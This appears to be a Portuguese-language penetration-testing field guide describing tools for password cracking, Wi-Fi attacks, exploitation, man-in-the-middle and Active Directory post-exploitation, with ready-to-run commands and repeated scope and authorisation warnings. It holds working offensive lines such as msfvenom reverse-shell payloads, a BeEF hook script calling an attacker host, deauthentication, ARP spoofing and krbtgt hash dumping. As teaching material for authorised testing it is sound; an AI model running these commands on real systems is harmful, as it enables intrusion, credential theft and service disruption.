Dois trabalhos completamente diferentes partilham este capítulo. Online significa enviar palpites a um serviço vivo, com risco de bloqueios, alertas e negação de serviço. Offline significa partir de um hash ou de uma captura e trabalhar em hardware próprio, onde os limites são o tempo, o calor e a força da palavra-passe. Usar o certo; o errado ou quebra o alvo ou desperdiça a GPU.

8 fichasonline vs offlinepolítica de bloqueio primeiro

Ler a política de autenticação antes do primeiro palpite

Bloqueio de conta, atraso exponencial, CAPTCHA, MFA, reputação de IP e alertas de SIEM fazem parte do desenho do alvo. Cinco palpites errados podem bloquear uma conta de serviço e parar um processo de negócio. Num engagement, acordar por escrito um orçamento de palpites e parar nele.

Hydra

pkg: hydra

O que faz. Teste de credenciais online em dezenas de protocolos (SSH, FTP, RDP, SMB, formulários HTTP, bases de dados e mais). É rápido, maduro e muito fácil de apontar à coisa errada.

hydra -L users.txt -P pass.txt -t 4 -f -V \
  -o evidence/creds/hydra-ssh.txt ssh://10.10.10.5

hydra -l admin -P pass.txt 10.10.10.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" -t 2 -f
Executar
Usar -t 4 ou menos em serviços reais, -f para parar no primeiro sucesso, e -u para iterar utilizadores antes das palavras-passe (reduz o risco de bloqueio por conta). Para formulários HTTP, copiar do proxy os nomes de campo e a string de falha exatos.
Evitar
Spray contra uma VPN ou um gateway de correio em produção. Não testar palavras-passe de colaboradores reais sem âmbito explícito, e nunca guardar credenciais recuperadas em texto simples fora do cofre de evidências.
Em vez de
O Hydra tem a lista de protocolos mais ampla; o Medusa é melhor em vários anfitriões; o ncrack é afinado para autenticação de rede com templates de temporização. Os três são ataques online.

Medusa

pkg: medusa

O que faz. Um testador de login online paralelo e modular. Foi pensado para testar muitos anfitriões ou utilizadores de uma vez, com módulos para serviços comuns e uma interface estável e fácil de usar em scripts.

medusa -h 10.10.10.5 -u admin -P pass.txt -M ssh \
  -t 4 -f -O evidence/creds/medusa-ssh.txt
Executar
Listar módulos com medusa -d. Usar -T para um ficheiro de anfitriões, -t para logins paralelos por anfitrião, e -O para o log de saída. Testar um par de credenciais manualmente antes de lançar uma lista.
Evitar
Paralelismo que esconde bloqueios: muitos anfitriões vezes muitos utilizadores podem bloquear todas as contas antes de se notar. Não usá-lo para «auditar» um serviço que não é teu.
Em vez de
O Medusa é cómodo para muitos anfitriões; o Hydra tem idiossincrasias de protocolo mais amplas e melhor tratamento de formulários HTTP; o ncrack foca-se na temporização da autenticação de rede. Nenhum contorna MFA.

ncrack

pkg: ncrack

O que faz. Um quebrador de autenticação de rede do projeto Nmap. Ataca SSH, RDP, FTP, Telnet, VNC, SMB e autenticação HTTP com templates de temporização e limites de ligação, e foi pensado para ser mais delicado com serviços frágeis que um ciclo paralelo ingénuo.

ncrack -U users.txt -P pass.txt ssh://10.10.10.5 \
  -f -CL 2 -T 2 -o evidence/creds/ncrack.txt
Executar
-T 0 é lento e educado, -T 5 é agressivo; começar em 2. -CL limita as ligações por serviço. Testar RDP com cuidado: os logins falhados são lentos e muito visíveis.
Evitar
Usar templates de temporização como desculpa para saltar o âmbito. Não correr contra um anfitrião cuja política de bloqueio não foi verificada; gateways RDP e VPN são especialmente sensíveis.
Em vez de
ncrack quando temporização e controlo de ligações importam; Hydra para amplitude e formulários HTTP; Medusa para muitos anfitriões. Para hashes, ir para offline com John ou hashcat.

John the Ripper

pkg: john

O que faz. Um quebrador de palavras-passe offline com uma lista enorme de formatos, regras, modos incrementais e os respetivos *2john extratores para ficheiros e material de chaves. É o cavalo de batalha de CPU e a ferramenta que transforma uma chave SSH, um ZIP ou uma base de dados de palavras-passe num hash quebrável.

ssh2john id_rsa > evidence/creds/id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=SSH --rules=Jumbo evidence/creds/id_rsa.hash
john --show --format=SSH evidence/creds/id_rsa.hash
Executar
Indicar o formato explicitamente; a autodeteção é cómoda mas fácil de ler mal. Usar --fork=N para núcleos de CPU, --session para execuções longas, e --pot para manter um pot file conhecido por engagement.
Evitar
Correr --incremental sem limite de comprimento num hash lento. Não apagar o pot file: é o resultado e a prova do trabalho.
Em vez de
O John é mais forte em CPU, conversão de formatos e tipos de ficheiro invulgares; o hashcat é mais forte em débito de GPU e ataques de regras/máscaras. Muitos operadores usam ambos.

hashcat

pkg: hashcat

O que faz. Um quebrador de palavras-passe acelerado por GPU com uma lista enorme de modos (MD5, NTLM, SHA-crypt, bcrypt, WPA, NetNTLMv2 e centenas mais), ataques por dicionário, combinação, máscara e regras, e um ficheiro de restauro para execuções longas.

hashcat -m 1000 -a 0 evidence/creds/ntlm.txt \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule \
  -O -w 3 --potfile-path=evidence/creds/hashcat.pot

hashcat -m 22000 -a 0 evidence/wifi/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt -O -w 2
Executar
Identificar o hash com hashcat --example-hashes ou com a ferramenta de origem, e depois escolher o modo. Usar -O para velocidade (limita o comprimento da palavra-passe), -w 2 numa máquina de trabalho, -w 3 só quando a GPU se pode arrefecer. Guardar o pot file.
Evitar
Adivinhar o modo; um -m errado desperdiça horas. Não correr -w 4 num portátil, e não afirmar que uma palavra-passe é forte porque o rockyou não a continha.
Em vez de
hashcat para débito de GPU e ataques de máscara/regras; John para trabalhos de CPU, conversão de formatos e hashes de ficheiros rápidos. Ambos leem o mesmo texto simples recuperado se o pot file for partilhado.

crunch

pkg: crunch

O que faz. Gera wordlists a partir de um conjunto de caracteres, um intervalo de comprimento e um padrão opcional. Serve para máscaras dirigidas (nome da empresa mais quatro dígitos), não para substituir um dicionário real.

crunch 8 8 -t Pass%%%% -o evidence/words/numeric.txt
crunch 6 8 abc123 -o evidence/words/alnum.txt
Executar
Em -t, @ significa minúsculas, , maiúsculas, % dígitos e ^ símbolos. Estimar o tamanho antes de escrever: 8 caracteres minúsculos são 208 mil milhões de linhas, não uma wordlist. Usar -b para dividir a saída por ficheiros.
Evitar
Encher o disco com um monstro combinatório. Não gerar uma lista na mesma partição do cofre de evidências; um disco cheio corrompe capturas e relatórios.
Em vez de
O cewl recolhe palavras do alvo; o crunch constrói padrões. Combinar uma lista pequena e específica do alvo com regras no hashcat ou no John antes de gerar combinações em bruto.

cewl

pkg: cewl

O que faz. Percorre um site e extrai palavras, frases e endereços de email para uma wordlist. Captura o vocabulário da organização — nomes de produtos, jargão, nomes de pessoas — que muitas vezes é mais útil que um dicionário genérico.

cewl -d 3 -m 5 --with-numbers -e \
  -w evidence/words/target-words.txt https://example.com
Executar
-d define a profundidade do crawl, -m o comprimento mínimo das palavras, -e recolhe emails, --with-numbers inclui variantes. Manter o crawl educado; uma wordlist não justifica um teste de carga.
Evitar
Percorrer a internet inteira ou um site cujos termos o proíbem. Não assumir que as palavras recolhidas cumprem a política de palavras-passe; combinar com mutações e regras.
Em vez de
Usar o cewl para a linguagem específica do alvo e depois as regras do hashcat ou do John para a mutar. O crunch é para padrões gerados, não para significado.

Responder

pkg: responder

O que faz. Escuta os protocolos de resolução de nomes por broadcast (LLMNR, NBT-NS, mDNS) e responde-lhes, capturando hashes NetNTLM de clientes Windows que pedem um nome que mais ninguém responde. Pode também correr serviços WPAD e proxy falsos.

sudo responder -I eth0 -wv
# analyse first, without poisoning:
sudo responder -I eth0 -A
Executar
Começar com -A para ver o que o segmento difunde. Depois correr uma janela de captura curta e anunciada. Quebrar o NetNTLMv2 offline com hashcat -m 5600, ou fazer relay com o ntlmrelayx quando a assinatura SMB o permite.
Evitar
Corrê-lo numa rede que não é tua: envenena a resolução de nomes e pode quebrar partilhas de ficheiros e impressão. Não o deixar a correr sem supervisão depois da janela de teste.
Em vez de
O Responder captura credenciais de serviços de nomes; o ettercap/bettercap fazem MITM L2 mais amplo; o hashcat transforma a captura numa palavra-passe. São um pipeline, não alternativas.

06

Wireless

O rádio é diferente: cada frame é um evento legal e físico

O teste wireless começa no hardware, não no software. O adaptador tem de suportar modo monitor e injeção de pacotes, e o controlador tem de os expor. Começa também na lei: intercetar tráfego de rádio que não se está autorizado a intercetar é crime em muitos países, e o deauth perturba utilizadores reais. Primeiro o laboratório, depois o cliente, nunca «só os vizinhos».

7 fichasmonitor + injeçãoa lei do rádio aplica-se

Verificar o hardware antes da toolchain

# Interface name, driver and supported modes
iw dev
iw list | grep -A 8 "Supported interface modes"
# A monitor-mode interface must appear after airmon-ng start; injection needs testing too.
sudo airmon-ng

Numa VM, passar o adaptador USB para o convidado. As placas Wi-Fi internas dos portáteis funcionam muitas vezes em modo monitor mas não em injeção, e alguns controladores falham sob carga de monitor. Um rtl8812au, ath9k_htc ou um adaptador externo comparável é a resposta habitual.

airmon-ng

pkg: aircrack-ng

O que faz. Gere interfaces em modo monitor para a suite Aircrack-ng. Lista adaptadores e respetivos controladores, para serviços que disputam a placa e cria uma interface de monitor como wlan0mon.

sudo airmon-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# mais tarde, restaurar o modo gerido: sudo airmon-ng stop wlan0mon
Executar
check kill para o NetworkManager, o wpa_supplicant e serviços semelhantes; contar com a queda do Wi-Fi normal. Anotar o nome da interface de monitor que imprime e passá-lo ao airodump-ng e companhia.
Evitar
Correr check kill por uma sessão SSH remota: pode cortar a ligação por onde se está a trabalhar. Não assumir que uma interface de monitor significa que a injeção funciona; testá-la.
Em vez de
iw dev wlan0 set type monitor é a via manual. O airmon-ng é um wrapper de conveniência e uma boa primeira verificação, não o único caminho.

airodump-ng

pkg: aircrack-ng

O que faz. Faz levantamento de redes 802.11 e captura frames: pontos de acesso, clientes, canais, cifra, intensidade de sinal e handshakes WPA. São os olhos passivos da suite Aircrack-ng.

sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w evidence/wifi/cap wlan0mon
Executar
Levantamento primeiro, depois fixar um BSSID e um canal. Esperar pelo marcador WPA handshake antes de parar. Para 5 GHz, usar --band a ou um canal específico; capturas do canal errado ficam vazias.
Evitar
Capturar tráfego alheio para além do necessário para provar o teste. Não deixar uma captura de várias horas a correr num canal movimentado; o ficheiro cresce e a evidência torna-se um problema de privacidade.
Em vez de
O Kismet é melhor para levantamentos passivos longos e registo; o airodump-ng é melhor para uma captura de handshake focada. Usar ambos se o engagement o permitir.

aireplay-ng

pkg: aircrack-ng

O que faz. Injeta frames 802.11: desautenticação, autenticação falsa, ARP replay e outros ataques. No teste moderno de WPA2, o seu uso legítimo principal é provocar um novo handshake num cliente que se está autorizado a testar.

sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 wlan0mon
Executar
Enviar um pequeno número de frames de deauth, só a um cliente autorizado, enquanto o airodump-ng captura. Parar assim que o handshake estiver capturado.
Evitar
Floods de deauth. Desligam utilizadores, cortam chamadas, disparam IDS wireless e podem ser crime de negação de serviço. WPA3/PMF pode ignorar os frames por completo.
Em vez de
Captura passiva primeiro; esperar por uma reconexão natural. Usar o wifite quando se quer a suite coordenada, e o bettercap quando é preciso um fluxo wireless/MITM mais amplo.

aircrack-ng

pkg: aircrack-ng

O que faz. Recupera chaves WEP e WPA/WPA2 de frames capturados usando uma wordlist ou, para WEP, ataques estatísticos. É baseado em CPU e deve ser tratado como a referência clássica, não como a opção moderna mais rápida.

aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF evidence/wifi/cap-01.cap
Executar
Confirmar que a captura contém realmente um handshake de quatro vias ou um PMKID antes de quebrar. Usar -e para o ESSID quando o BSSID é ambíguo, e guardar o hash da captura para o relatório.
Evitar
Quebras longas em CPU num portátil quando há uma GPU e hashcat disponíveis. O WEP é histórico; encontrá-lo é um achado, mas não se constrói uma metodologia moderna à volta dele.
Em vez de
hcxtools + hashcat -m 22000 é o pipeline WPA moderno. O aircrack-ng continua útil para uma verificação rápida e para aprender a história ao nível do frame.

hcxtools

pkg: hcxtools

O que faz. Converte capturas wireless em formatos compatíveis com o hashcat: handshakes EAPOL, PMKID e hashes WEP antigos. hcxpcapngtool é a ponte entre as capturas do aircrack-ng e a quebra em GPU.

hcxpcapngtool -o evidence/wifi/hash.hc22000 \
  -E evidence/wifi/essid.txt evidence/wifi/cap.pcapng
hashcat -m 22000 -a 0 evidence/wifi/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt -O -w 2
Executar
Alimentá-lo com o pcapng em bruto, não com uma exportação de texto. Verificar no resumo se há um handshake completo ou um PMKID. Correr o hashcat -m 22000 com as regras adequadas e guardar o pot file.
Evitar
Assumir que há sempre um PMKID; não é qualquer ponto de acesso que o expõe. Não publicar capturas que contenham identificadores de outros clientes.
Em vez de
hcxtools + hashcat é o caminho rápido e moderno; o aircrack-ng é o clássico tudo-em-um. Usar o hcxtools quando a quebra em GPU importa.

wifite

pkg: wifite

O que faz. Automatiza o fluxo do Aircrack-ng: faz scan, seleciona alvos, captura handshakes, tenta WPS e entrega as capturas a um quebrador. É um coordenador, não uma capacidade de rádio nova.

sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt \
  --kill --nodeauths
Executar
Restringir a um alvo com --target-bssid e usar --nodeauths a menos que haja permissão explícita para deauth. --kill para os serviços em conflito; vai desligar o Wi-Fi normal.
Evitar
Corrê-lo com os valores por omissão numa zona povoada: ataca todas as redes que vê. Não usar ataques WPS em redes que não são tuas; o WPS está muitas vezes desativado ou bloqueado de qualquer forma.
Em vez de
Usar o wifite para uma captura guiada em laboratório; usar as ferramentas individuais quando é preciso controlo e evidência limpa. O Kismet faz levantamento; o bettercap acrescenta módulos MITM.

Kismet

pkg: kismet

O que faz. Um detetor, levantador e IDS wireless passivo. Descobre pontos de acesso, clientes, probes e dispositivos Bluetooth, registando tudo com suporte de GPS e servindo uma interface web. Não precisa de transmitir para mapear um ambiente de rádio.

sudo kismet -c wlan0mon
# web UI: http://127.0.0.1:2501
Executar
Pôr a placa em modo monitor primeiro. Usar um diretório de captura dedicado, definir um nome de fonte e exportar a base de dados/logs como evidência. O Kismet é ideal para um levantamento de site antes de qualquer teste ativo.
Evitar
Expor a UI web para além de localhost sem autenticação e TLS. Não ativar fontes ativas a menos que se queira transmitir.
Em vez de
O Kismet é amplitude passiva e registo; o airodump-ng é captura focada; o wifite automatiza ataques; o bettercap é MITM ativo. Fazer levantamento com o Kismet antes de escolher um alvo.

07

Exploração

Prova de impacto, não uma coleção de shells

A exploração é a parte mais pequena de uma avaliação e a mais fácil de errar. O objetivo não é um exploit a funcionar; é uma demonstração reprodutível e dentro do âmbito do impacto no negócio. As escolhas desta secção são um framework, um arquivo, um gerador de payloads e um hook de browser — quatro trabalhos diferentes que se confundem porque todos produzem «acesso».

4 fichasverificar primeiroimpacto mínimo

O âmbito não cresce com a shell

Uma sessão no anfitrião A não é permissão para pivotar para o B. Cada anfitrião, credencial e repositório de dados novo tem de estar já no âmbito ou aprovado por escrito. Parar na prova acordada: uma listagem de ficheiros, uma captura de ecrã, um comando só de leitura. Persistência, roubo de dados e movimento lateral são autorizações separadas, não direitos automáticos.

Metasploit Framework

pkg: metasploit-framework

O que faz. Um framework de exploração: módulos para scanning, exploração, entrega de payloads e pós-exploração, apoiados por uma base de dados de anfitriões, serviços, credenciais e loot. Normaliza as partes aborrecidas para que o foco fique no comportamento específico do alvo.

sudo msfdb init
msfconsole -q
msf6 > workspace -a client
msf6 > db_import evidence/scans/services.xml
msf6 > search type:exploit platform:linux smb
msf6 > use exploit/linux/samba/is_known_pipename
msf6 > show options
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST 10.10.14.2
msf6 > check
msf6 > run
msf6 > sessions -l
Executar
Inicializar a base de dados uma vez, importar o XML do nmap e usar check quando o módulo o suporta. Ler info antes de run. Usar setg para valores partilhados entre módulos e spool para manter uma transcrição.
Evitar
Disparar um exploit só porque o nome corresponde a um banner. Não correr módulos auxiliary/scanner por gamas inteiras, e não deixar sessões abertas depois da janela de teste.
Em vez de
O searchsploit é um arquivo estático de exploits; o Metasploit é um framework em execução com payloads e sessões. O msfvenom gera payloads; o BeEF liga-se a browsers. Complementam-se, não se substituem.
Ler o manual de campo completo do Metasploit

searchsploit

pkg: exploitdb

O que faz. Pesquisa uma cópia local do Exploit-DB e copia código de exploit para o diretório de trabalho. É a forma mais rápida de responder a «existe código público para este produto e versão exatos?» sem um browser.

searchsploit apache 2.4.49
searchsploit -w apache 2.4
searchsploit -m 50383
searchsploit -x 50383
Executar
Pesquisar por produto e versão, depois abrir o exploit com -x e lê-lo antes de fazer seja o que for. -m copia-o para o diretório atual. Verificar a plataforma, os pré-requisitos e a versão afetada no cabeçalho.
Evitar
Correr código de exploit descarregado às cegas. Os exploits públicos estão frequentemente incompletos, são destrutivos, antigos ou maliciosos. Compilar numa VM isolada, rever cada comando e nunca apontar um exploit não testado a produção.
Em vez de
O searchsploit encontra código; o Metasploit corre um módulo curado. Se existe um módulo Metasploit, é normalmente mais seguro e mais fácil de registar. Se não existe, o searchsploit é o arquivo.

msfvenom

pkg: metasploit-framework

O que faz. Gera payloads e codifica-os em executáveis, scripts, documentos e formatos em bruto. Cria o ficheiro que chama de volta o handler; não o entrega, e não torna malware indetetável.

msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 -f elf -o agent.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe

msfvenom -l payloads | less
msfvenom -l formats | less
Executar
Adequar a arquitetura ao alvo e o payload ao handler. A forma staged (meterpreter/reverse_tcp) precisa de um multi/handler; a forma stageless (meterpreter_reverse_tcp) embute tudo. Testar em laboratório, verificar com file, e guardar o comando exato nas notas.
Evitar
Acreditar que um encoder é um bypass de antivírus. Não enviar payloads por email, não os alojar publicamente, nem usá-los fora de um laboratório autorizado; isso é entrega de malware, não um teste.
Em vez de
O msfvenom constrói o artefacto; o handler do Metasploit recebe-o; o searchsploit encontra a vulnerabilidade que permite executá-lo. Três fases, não uma ferramenta.

BeEF

pkg: beef-xss

O que faz. O Browser Exploitation Framework: quando um payload XSS liga um browser, o BeEF dá uma consola de módulos que pode fazer fingerprint, ler o DOM, capturar teclas, redirecionar ou lançar pedidos de engenharia social — apenas dentro do que o browser e a página permitem.

sudo beef-xss
# UI: http://127.0.0.1:3000
# Hook (authorised lab page):
<script src="http://10.10.14.2:3000/hook.js"></script>
Executar
Mudar as credenciais por omissão antes de expor seja o que for. O URL do hook tem de ser alcançável a partir do browser da vítima, e a página tem de estar no âmbito. Usar um perfil de browser de teste e registar as ações dos módulos como evidência.
Evitar
Usá-lo sem uma primitiva real de XSS ou de injeção de HTML; o BeEF não é um exploit de rede. Não expor a consola publicamente, e não usar módulos de engenharia social em colaboradores reais sem permissão explícita.
Em vez de
O Metasploit explora serviços e sessões; o BeEF monta num browser já ligado. A descoberta de XSS vem de teste manual ou de um scanner; o BeEF é a consola de pós-exploração desse browser.

08

Sniffing e man-in-the-middle

Ver os pacotes e depois decidir se é permitido alterá-los

A captura de pacotes responde a «o que passou realmente pelo cabo?». O MITM responde a «o que acontece se eu ficar no meio?». A primeira é passiva e relativamente segura; a segunda altera a rede, quebra sessões e é fácil de correr fora do âmbito. Aprender a ler uma captura antes de envenenar uma tabela ARP.

6 fichasBPF vs filtros de visualizaçãoO MITM altera tráfego

Filtros de captura e filtros de visualização

A filtro de captura (BPF, usado pela captura do tcpdump/tshark/Wireshark e pelo dumpcap) decide o que é escrito no disco e não pode ser mudado depois. Um filtro de visualização (expressão Wireshark/tshark) decide o que se vê de uma captura existente. Filtrar na captura para poupar disco; filtrar na visualização para investigar.

Wireshark

pkg: wireshark

O que faz. O analisador de pacotes gráfico de referência: centenas de dissectores de protocolos, seguimento de streams, exportação de objetos, estatísticas, regras de cor e suporte a decifra. Lê capturas produzidas pelo dumpcap, tshark ou tcpdump.

sudo dumpcap -i eth0 -b filesize:100000 \
  -w evidence/sniff/capture.pcapng
sudo wireshark evidence/sniff/capture.pcapng
Executar
Capturar com um filtro como tcp port 80 or tcp port 443, depois usar filtros de visualização como http.request.method == "POST" ou tcp.flags.syn == 1 && tcp.flags.ack == 0. Seguir um stream para ler uma conversa; exportar objetos HTTP para recuperar ficheiros.
Evitar
Capturar dados pessoais sem necessidade nem regra de retenção. Não correr o Wireshark como root todo o dia; adicionar o utilizador ao grupo wireshark ou usar as capacidades do dumpcap. O TLS não é legível sem chaves ou um proxy.
Em vez de
Wireshark para investigação visual; tshark para a mesma dissecação num servidor; tcpdump quando só se precisa de captura e de uma vista rápida em hex/texto.

tshark

pkg: tshark

O que faz. O motor de terminal do Wireshark. Captura e disseca pacotes e depois extrai campos nomeados para texto, CSV ou JSON — ideal para servidores, automação e capturas grandes onde não há GUI.

tshark -i eth0 -f "tcp port 443" -Y "tls.handshake.type == 1" \
  -T fields -e ip.src -e tls.handshake.extensions_server_name

tshark -r evidence/sniff/capture.pcapng -Y "http.request" \
  -T fields -e http.host -e http.request.uri

tshark -r evidence/sniff/capture.pcapng -q -z io,phs
Executar
-f é o filtro de captura BPF; -Y é o filtro de visualização; -T fields -e seleciona colunas. Escrever com -w, ler com -r. Verificar as contagens de descartes em ligações movimentadas.
Evitar
Despejar detalhes completos de pacotes num terminal numa ligação de tráfego elevado. Não fazer parsing com scraping de texto frágil quando -T json dá estrutura.
Em vez de
O tshark disseca protocolos como o Wireshark; o tcpdump é mais leve e não descodifica camadas de aplicação. Usar o tshark quando a extração de campos importa.

tcpdump

pkg: tcpdump

O que faz. Uma ferramenta de captura libpcap pequena e omnipresente. Escreve pacotes em bruto num ficheiro ou imprime um resumo compacto, e a sua sintaxe BPF é a linguagem comum da captura de pacotes. É a ferramenta com que se pode contar quando nada mais está instalado.

sudo tcpdump -i eth0 -nn -s0 -w evidence/sniff/cap.pcap \
  'tcp port 80 or tcp port 443'

sudo tcpdump -r evidence/sniff/cap.pcap -nn -A 'tcp port 80'
Executar
-s0 captura o pacote completo; -nn evita consultas DNS e de serviços; -w escreve, -r lê. Usar -c para uma contagem de pacotes e -C ou -G para rodar ficheiros. Verificar a linha «packets dropped» ao parar.
Evitar
Capturar em any à velocidade máxima e encher o disco. Não imprimir payloads com -A num terminal que se está a partilhar ou a gravar; as credenciais podem aparecer em texto simples.
Em vez de
tcpdump quando é precisa uma captura pequena e fiável; Wireshark/tshark quando é precisa dissecação de protocolos. O tcpdump field manual deste blog aprofunda a gramática dos filtros.

Ettercap

pkg: ettercap

O que faz. Uma suite MITM clássica de camada 2: envenenamento ARP, dissectores de protocolos, plugins e filtros. Pode colocar-nos entre anfitriões, modificar tráfego com filtros e capturar credenciais de protocolos inseguros.

sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -q -i eth0 -M arp:remote \
  /192.168.1.1// /192.168.1.50//
# restaurar o forwarding e parar o envenenamento no fim
Executar
Usar -T para texto ou -G para a GUI; -M arp:remote seleciona o método de envenenamento; -w escreve um pcap. Confirmar que o IP forwarding está ligado antes de o tráfego fluir, e restaurar as tabelas ARP no fim.
Evitar
Envenenar um gateway de produção. O HTTPS não fica legível só porque se está no meio; é preciso interceção TLS e uma CA de confiança. Os filtros podem corromper tráfego e quebrar aplicações.
Em vez de
O bettercap é a alternativa moderna e modular, com proxying HTTP/HTTPS e uma consola viva. O ettercap continua útil para filtros antigos e um teste ARP rápido.

bettercap

pkg: bettercap

O que faz. Uma consola MITM modular para Wi-Fi, Ethernet, Bluetooth LE, ARP, DNS, HTTP/HTTPS e mais. Os caplets programam a sessão, e uma só interface pode passar da descoberta ao spoofing e à captura de credenciais sem mudar de ferramenta.

sudo bettercap -iface eth0
> net.probe on
> net.show
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on

sudo bettercap -iface wlan0
> wifi.recon on
> wifi.show
> wifi.deauth AA:BB:CC:DD:EE:FF
Executar
Escrever help dentro da consola. Limitar o alvo com set arp.spoof.targets, ativar só os módulos necessários e vigiar o fluxo de eventos. Usar caplets para fluxos repetíveis e registar a sessão.
Evitar
Correr net.probe e spoofing numa rede que não é tua. O proxying HTTPS precisa de uma CA no cliente; o sslstrip é detetável, quebra sites e não substitui uma interceção TLS em condições.
Em vez de
O bettercap é a suite moderna ampla; o ettercap é a ferramenta L2 clássica; o Responder especializa-se na captura de credenciais por resolução de nomes. Não correr as três ao mesmo tempo.

mitmproxy

pkg: mitmproxy

O que faz. Um proxy de interceção programável com três faces: mitmproxy (TUI), mitmweb (UI de browser) e mitmdump (headless). Addons Python podem reescrever pedidos, repetir fluxos e inspecionar TLS decifrado.

mitmproxy -p 8080
mitmweb -p 8081
mitmdump -w evidence/sniff/flows.mitm -p 8080
Executar
Instalar a CA do mitmproxy no cliente de teste e depois apontar o proxy do cliente ao listener. Usar --allow-hosts para limitar o âmbito e -w para guardar fluxos. Os addons são a razão para o escolher em vez de um proxy com GUI.
Evitar
Fazer proxy do tráfego de outras pessoas sem autorização. Não registar credenciais nem dados pessoais para além do mínimo; os fluxos são evidência e responsabilidade ao mesmo tempo.
Em vez de
Burp/ZAP para teste web manual; mitmproxy para automação, fluxos CLI e lógica Python personalizada. Os três precisam da mesma confiança de certificados e da mesma disciplina de âmbito.

Active Directory e pós-exploração

Primeiro o grafo, depois o varrimento, tocar o mínimo

O Active Directory é um grafo de identidades, permissões e relações de confiança. A ordem profissional é: recolher o grafo, encontrar o caminho mais curto para o objetivo, usar a técnica menos invasiva que o prova, e parar. Fazer spray de credenciais antes de compreender a política de bloqueio é como as avaliações causam indisponibilidade.

4 fichasrecolher → grafo → ação mínimapolítica de bloqueio

BloodHound

pkg: bloodhound

O que faz. Recolhe relações do AD (utilizadores, grupos, computadores, sessões, ACLs, relações de confiança) para um grafo Neo4j e corre consultas que mostram caminhos de ataque — por exemplo, o caminho mais curto de um utilizador comprometido a Domain Admin.

sudo neo4j console
bloodhound
# collector from a Linux host:
bloodhound-python -u user -p 'pass' -d CORP.LOCAL \
  -ns 10.10.0.10 -c DCOnly --zip
Executar
Iniciar o Neo4j antes da GUI e mudar a palavra-passe por omissão. Importar o ZIP e usar as consultas incluídas, como «Shortest Paths to Domain Admins». -c DCOnly é mais silencioso; -c All acrescenta sessões, que são ruidosas e sensíveis ao tempo.
Evitar
Recolher o domínio inteiro «só porque sim». Não deixar o Neo4j a escutar numa interface pública, e tratar o grafo como dados sensíveis do cliente — é um mapa de todas as fraquezas do domínio.
Em vez de
O NetExec encontra serviços e partilhas acessíveis; o BloodHound explica porque uma identidade pode chegar a Domain Admin. Usar o NetExec para validar um caminho, não para o adivinhar.

NetExec (nxc)

pkg: netexec

O que faz. O sucessor mantido do CrackMapExec: um varrimento de rede ciente do protocolo para SMB, WinRM, LDAP, MSSQL, SSH e mais. Valida credenciais, lista partilhas, utilizadores e sessões, e corre módulos contra anfitriões onde a credencial funciona.

nxc smb 10.10.10.0/24 -u user -p 'pass' -d CORP --shares
nxc smb 10.10.10.5 -u user -p 'pass' -d CORP --users --sessions
nxc winrm 10.10.10.5 -u user -p 'pass' -d CORP -x whoami
nxc ldap dc.corp.local -u user -p 'pass' --bloodhound --collection DCOnly
Executar
Testar uma credencial contra um anfitrião antes de qualquer varrimento. Usar --jitter e um --timeoutconservador, e parar no sucesso nos módulos que o suportam. --shares é só de leitura; -x executa um comando e é muito mais ruidoso.
Evitar
Spray de palavras-passe sem o limiar de bloqueio, a janela de observação e um orçamento de palpites escrito. Não usar -x para correr comandos destrutivos ou extrair dados para além da prova acordada.
Em vez de
O NetExec é uma camada rápida de varrimento e validação; o Impacket dá uma operação de protocolo precisa; o BloodHound mapeia o caminho. O CrackMapExec é o nome antigo — preferir nxc no Kali atual.

Impacket

pkg: impacket-scripts

O que faz. Uma biblioteca Python e um conjunto de scripts pontuais para protocolos de rede Windows: SMB, MSRPC, WMI, Kerberos, LDAP e mais. secretsdump, wmiexec, GetUserSPNs e ntlmrelayx são os cavalos de batalha.

impacket-GetUserSPNs CORP/user:'pass' -dc-ip 10.10.0.10 -request
impacket-secretsdump -just-dc-user krbtgt \
  CORP/user:'pass'@dc.corp.local
impacket-wmiexec CORP/user:'pass'@10.10.10.5
impacket-ntlmrelayx -tf targets.txt -smb2support
Executar
Usar -just-dc-user ou um alvo estreito em vez de extrair o domínio inteiro. Guardar a saída com -outputfile, e preferir Kerberos (-k -no-pass) quando há um ticket. Ler a ajuda do script antes de o usar.
Evitar
Correr ntlmrelayx sem verificar a assinatura SMB e sem uma lista de alvos. Não deixar hashes extraídos no scrollback de um terminal ou num ficheiro de notas não cifrado.
Em vez de
Impacket para uma operação de protocolo precisa e scripting; NetExec para varrer; Metasploit para uma cadeia de exploração empacotada. Partilham conceitos, não sintaxe.

Evil-WinRM

pkg: evil-winrm

O que faz. Uma shell WinRM interativa com upload/download de ficheiros, carregamento de scripts PowerShell, execução de binários e suporte a pass-the-hash. É a forma confortável de trabalhar num anfitrião Windows quando há credenciais administrativas válidas.

evil-winrm -i 10.10.10.5 -u user -p 'pass'
evil-winrm -i 10.10.10.5 -u user -H NTHASH
evil-winrm -i 10.10.10.5 -u user -p 'pass' \
  -s ./scripts -e ./binaries
Executar
O WinRM tem de estar ativo (5985/5986) e a conta tem de estar no grupo certo. Usar upload/download com moderação, e manter uma transcrição. A autenticação por certificado (-S/-K) evita palavras-passe quando está configurada.
Evitar
Fazer upload de ferramentas que não foram revistas; tudo o que se deixa fica como evidência e possível malware. Não manter uma shell interativa aberta depois do engagement nem usá-la para navegar em dados alheios.
Em vez de
wmiexec/psexec são outros caminhos de execução com artefactos diferentes; o WinRM é cómodo mas fica registado. Escolher consoante o ambiente e a evidência que se quer deixar.

Forense e engenharia inversa

Preservar primeiro, analisar depois, explicar por último

